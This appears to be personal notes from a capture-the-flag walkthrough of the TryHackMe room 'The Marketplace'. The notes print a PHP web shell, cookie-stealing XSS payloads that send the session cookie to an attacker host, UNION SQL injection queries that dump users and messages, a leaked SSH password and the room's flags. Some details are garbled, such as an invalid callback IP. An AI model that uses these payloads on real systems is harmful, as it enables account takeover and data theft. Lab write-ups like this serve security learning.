## The Marketplace

```
export $IP=10.10.112.3
```

***Briefing
The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.***



- Finding found a JWT Token present

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNzQwNDY4MjQyfQ.P6DhcP0D_Xp8ZCLfecimxWmcPapzK0hs3yr_Givf_is
```
# decoded header :
```
	{
	  "alg": "HS256",
	  "typ": "JWT"
	}
```
# decoded payload
```
	{
	  "userId": 4,
	  "username": "test",
	  "admin": false,
	  "iat": 1740468242
	}
```
- found a disabled file upload on the add listing page
- uploaded a php shell
# php shell:
```

         <?php system($_GET["cmd"]); ?>

```
- Started directory busting with gobuster to check the shell uploaded

# gobuster
```
   gobuster dir -u http://10.10.112.3  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x sh,cgi,log,html,php 
```

- found a stored xss at new listing tried classic vanilla  xss

```
  
  	test <script>alert(1)</script>

```
- ***found insecure flag settings in cookies  so we can steal cookies of admin***
   redirect the document.cookie throught callback on the local machine via
```

	test<script>document.location="http://$IP/"+document.cookie</script>

```
 not a recommended method because the user page gets redirected to attackers server  and if the attacker server isnt serving anything the page stops of lags , it does fresh a request and we dont want one , we do want asynchronous
 request this is another method and this method  doesnt block the main thread of javascript which is document,make a tag object and its attributes will request  the server 

 we want async request so payload for the same is 
 ```
 <script>
 var img=new Image();
 img.src="http://10.9.241.1740468242/?cookie=" +document.cookie
 </script>
```
Here we just created an img variable and stored Image object in it  and on the next line I just accesed the attribute of Image object src through img.
so the img.src will make an request to our endpoint and this will evaluate to "http://$IP/?cookie=" +document.cookie to the document.cookie and will appear in log section of our server
start the listner and add the listing we will get our cookie back in output

now if we report listing to admin our payload will evaluate to admin's cookie
```
GET /?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NDE0NTU2ODV9.gYBdkR3cnQnIcw7FOLN8R50pIFtZ2k0z4S7PCIehKUA
```
so 
## Flag 1
```
THM{c37a63895910e478f28669b048c348d5}
```
sql injection query for backend
```
select user_name,user_id,is_admin,column_4 from users where user_id = $user_id order by 4;
```

```
?user=0 union select 5,(select group_concat(table_name) from information_schema.tables where table_schma=marketplace),7,8;
```	

output for table 
```
 User items,messages,users
ID: 5
Is administrator: true
```
output for  column name
```
user=0 union select  5,(select group_concat(column_name) from information_schema.columns where table_name='users'),7,8;
```

output ::
```
user=0 union select  (select group_concat(username) from users),(select group_concat(password) from users),7,8;
```
hashes are uncrackable because they are bcrypt

```
user=0 union select  5,(select group_concat(column_name) from information_schema.columns where table_name='messages'),7,8;
```
output
User id,user_from,user_to,message_content,is_read
ID: 5
Is administrator: true

```
select group_concat(message_content) from messages
```

 Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ

 probably the password is for jake 

 for privesc creat files check and check point 

 python -c "import pty;pty.spawn('/bin/bash')"


Root flag
```
 THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```